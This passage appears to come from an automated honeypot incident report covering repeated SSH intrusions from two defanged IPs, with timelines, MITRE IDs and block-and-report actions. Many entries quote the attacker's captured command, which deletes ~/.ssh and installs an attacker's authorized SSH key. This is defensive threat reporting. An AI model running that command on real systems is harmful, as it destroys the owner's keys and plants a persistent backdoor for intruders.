| `2026-06-09 04:15:18` | `cowrie.client.version` |
| `2026-06-09 04:15:18` | `cowrie.client.kex` |
| `2026-06-09 04:15:19` | `cowrie.login.success` |
| `2026-06-09 04:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0f8a9f561e

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:18 |
| **Last Seen** | 2026-06-09 04:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:18:31` | `cowrie.session.connect` |
| `2026-06-09 04:18:31` | `cowrie.client.version` |
| `2026-06-09 04:18:31` | `cowrie.client.kex` |
| `2026-06-09 04:18:32` | `cowrie.login.success` |
| `2026-06-09 04:18:32` | `cowrie.session.params` |
| `2026-06-09 04:18:32` | `cowrie.command.input` |
| `2026-06-09 04:18:32` | `cowrie.command.failed` |
| `2026-06-09 04:18:32` | `cowrie.log.closed` |
| `2026-06-09 04:18:32` | `cowrie.session.params` |
| `2026-06-09 04:18:32` | `cowrie.command.input` |
| `2026-06-09 04:18:32` | `cowrie.session.file_download` |
| `2026-06-09 04:18:32` | `cowrie.log.closed` |
| `2026-06-09 04:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e01ee42fcc

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:18 |
| **Last Seen** | 2026-06-09 04:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:18:34` | `cowrie.session.connect` |
| `2026-06-09 04:18:34` | `cowrie.client.version` |
| `2026-06-09 04:18:35` | `cowrie.client.kex` |
| `2026-06-09 04:18:35` | `cowrie.login.success` |
| `2026-06-09 04:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efbda05a87ce

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:19 |
| **Last Seen** | 2026-06-09 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:19:03` | `cowrie.session.connect` |
| `2026-06-09 04:19:03` | `cowrie.client.version` |
| `2026-06-09 04:19:03` | `cowrie.client.kex` |
| `2026-06-09 04:19:03` | `cowrie.login.success` |
| `2026-06-09 04:19:04` | `cowrie.session.params` |
| `2026-06-09 04:19:04` | `cowrie.command.input` |
| `2026-06-09 04:19:04` | `cowrie.command.failed` |
| `2026-06-09 04:19:04` | `cowrie.log.closed` |
| `2026-06-09 04:19:04` | `cowrie.session.params` |
| `2026-06-09 04:19:04` | `cowrie.command.input` |
| `2026-06-09 04:19:04` | `cowrie.session.file_download` |
| `2026-06-09 04:19:04` | `cowrie.log.closed` |
| `2026-06-09 04:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea4d141fe6d3

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:19 |
| **Last Seen** | 2026-06-09 04:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:19:05` | `cowrie.session.connect` |
| `2026-06-09 04:19:05` | `cowrie.client.version` |
| `2026-06-09 04:19:05` | `cowrie.client.kex` |
| `2026-06-09 04:19:05` | `cowrie.login.success` |
| `2026-06-09 04:19:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d5327e02f67

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:21 |
| **Last Seen** | 2026-06-09 04:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:21:48` | `cowrie.session.connect` |
| `2026-06-09 04:21:48` | `cowrie.client.version` |
| `2026-06-09 04:21:49` | `cowrie.client.kex` |
| `2026-06-09 04:21:49` | `cowrie.login.success` |
| `2026-06-09 04:21:49` | `cowrie.session.params` |
| `2026-06-09 04:21:49` | `cowrie.command.input` |
| `2026-06-09 04:21:49` | `cowrie.command.failed` |
| `2026-06-09 04:21:50` | `cowrie.log.closed` |
| `2026-06-09 04:21:50` | `cowrie.session.params` |
| `2026-06-09 04:21:50` | `cowrie.command.input` |
| `2026-06-09 04:21:50` | `cowrie.session.file_download` |
| `2026-06-09 04:21:50` | `cowrie.log.closed` |
| `2026-06-09 04:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e989cffc077

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:21 |
| **Last Seen** | 2026-06-09 04:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:21:52` | `cowrie.session.connect` |
| `2026-06-09 04:21:52` | `cowrie.client.version` |
| `2026-06-09 04:21:52` | `cowrie.client.kex` |
| `2026-06-09 04:21:53` | `cowrie.login.success` |
| `2026-06-09 04:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca05f50fd53d

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:24 |
| **Last Seen** | 2026-06-09 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:24:39` | `cowrie.session.connect` |
| `2026-06-09 04:24:39` | `cowrie.client.version` |
| `2026-06-09 04:24:39` | `cowrie.client.kex` |
| `2026-06-09 04:24:39` | `cowrie.login.success` |
| `2026-06-09 04:24:39` | `cowrie.session.params` |
| `2026-06-09 04:24:39` | `cowrie.command.input` |
| `2026-06-09 04:24:39` | `cowrie.command.failed` |
| `2026-06-09 04:24:39` | `cowrie.log.closed` |
| `2026-06-09 04:24:39` | `cowrie.session.params` |
| `2026-06-09 04:24:39` | `cowrie.command.input` |
| `2026-06-09 04:24:39` | `cowrie.session.file_download` |
| `2026-06-09 04:24:39` | `cowrie.log.closed` |
| `2026-06-09 04:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68eb0a0decc

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:24 |
| **Last Seen** | 2026-06-09 04:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:24:41` | `cowrie.session.connect` |
| `2026-06-09 04:24:41` | `cowrie.client.version` |
| `2026-06-09 04:24:41` | `cowrie.client.kex` |
| `2026-06-09 04:24:41` | `cowrie.login.success` |
| `2026-06-09 04:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8900c3c8db0b

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:24 |
| **Last Seen** | 2026-06-09 04:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:24:54` | `cowrie.session.connect` |
| `2026-06-09 04:24:54` | `cowrie.client.version` |
| `2026-06-09 04:24:54` | `cowrie.client.kex` |
| `2026-06-09 04:24:55` | `cowrie.login.success` |
| `2026-06-09 04:24:55` | `cowrie.session.params` |
| `2026-06-09 04:24:55` | `cowrie.command.input` |
| `2026-06-09 04:24:55` | `cowrie.command.failed` |
| `2026-06-09 04:24:55` | `cowrie.log.closed` |
| `2026-06-09 04:24:56` | `cowrie.session.params` |
| `2026-06-09 04:24:56` | `cowrie.command.input` |
| `2026-06-09 04:24:56` | `cowrie.session.file_download` |
| `2026-06-09 04:24:56` | `cowrie.log.closed` |
| `2026-06-09 04:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8dba292cb30

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:24 |
| **Last Seen** | 2026-06-09 04:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:24:58` | `cowrie.session.connect` |
| `2026-06-09 04:24:58` | `cowrie.client.version` |
| `2026-06-09 04:24:58` | `cowrie.client.kex` |
| `2026-06-09 04:24:58` | `cowrie.login.success` |
| `2026-06-09 04:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7271ddd032ed

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:26 |
| **Last Seen** | 2026-06-09 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:26:30` | `cowrie.session.connect` |
| `2026-06-09 04:26:30` | `cowrie.client.version` |
| `2026-06-09 04:26:30` | `cowrie.client.kex` |
| `2026-06-09 04:26:30` | `cowrie.login.success` |
| `2026-06-09 04:26:30` | `cowrie.session.params` |
| `2026-06-09 04:26:30` | `cowrie.command.input` |
| `2026-06-09 04:26:30` | `cowrie.command.failed` |
| `2026-06-09 04:26:30` | `cowrie.log.closed` |
| `2026-06-09 04:26:31` | `cowrie.session.params` |
| `2026-06-09 04:26:31` | `cowrie.command.input` |
| `2026-06-09 04:26:31` | `cowrie.session.file_download` |
| `2026-06-09 04:26:31` | `cowrie.log.closed` |
| `2026-06-09 04:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498271aecaad

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:26 |
| **Last Seen** | 2026-06-09 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:26:32` | `cowrie.session.connect` |
| `2026-06-09 04:26:32` | `cowrie.client.version` |
| `2026-06-09 04:26:32` | `cowrie.client.kex` |
| `2026-06-09 04:26:32` | `cowrie.login.success` |
| `2026-06-09 04:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eea77951644

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:28 |
| **Last Seen** | 2026-06-09 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:28:18` | `cowrie.session.connect` |
| `2026-06-09 04:28:18` | `cowrie.client.version` |
| `2026-06-09 04:28:18` | `cowrie.client.kex` |
| `2026-06-09 04:28:18` | `cowrie.login.success` |
| `2026-06-09 04:28:18` | `cowrie.session.params` |
| `2026-06-09 04:28:18` | `cowrie.command.input` |
| `2026-06-09 04:28:18` | `cowrie.command.failed` |
| `2026-06-09 04:28:18` | `cowrie.log.closed` |
| `2026-06-09 04:28:18` | `cowrie.session.params` |
| `2026-06-09 04:28:18` | `cowrie.command.input` |
| `2026-06-09 04:28:18` | `cowrie.session.file_download` |
| `2026-06-09 04:28:18` | `cowrie.log.closed` |
| `2026-06-09 04:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2880fe4fc277

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:28 |
| **Last Seen** | 2026-06-09 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:28:19` | `cowrie.session.connect` |
| `2026-06-09 04:28:19` | `cowrie.client.version` |
| `2026-06-09 04:28:19` | `cowrie.client.kex` |
| `2026-06-09 04:28:19` | `cowrie.login.success` |
| `2026-06-09 04:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-560f94f5f612

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:30 |
| **Last Seen** | 2026-06-09 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:30:04` | `cowrie.session.connect` |
| `2026-06-09 04:30:04` | `cowrie.client.version` |
| `2026-06-09 04:30:04` | `cowrie.client.kex` |
| `2026-06-09 04:30:04` | `cowrie.login.success` |
| `2026-06-09 04:30:04` | `cowrie.session.params` |
| `2026-06-09 04:30:04` | `cowrie.command.input` |
| `2026-06-09 04:30:04` | `cowrie.command.failed` |
| `2026-06-09 04:30:04` | `cowrie.log.closed` |
| `2026-06-09 04:30:04` | `cowrie.session.params` |
| `2026-06-09 04:30:04` | `cowrie.command.input` |
| `2026-06-09 04:30:04` | `cowrie.session.file_download` |
| `2026-06-09 04:30:04` | `cowrie.log.closed` |
| `2026-06-09 04:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f697605496a

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:30 |
| **Last Seen** | 2026-06-09 04:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:30:06` | `cowrie.session.connect` |
| `2026-06-09 04:30:06` | `cowrie.client.version` |
| `2026-06-09 04:30:06` | `cowrie.client.kex` |
| `2026-06-09 04:30:06` | `cowrie.login.success` |
| `2026-06-09 04:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24304318d0d0

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:31 |
| **Last Seen** | 2026-06-09 04:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
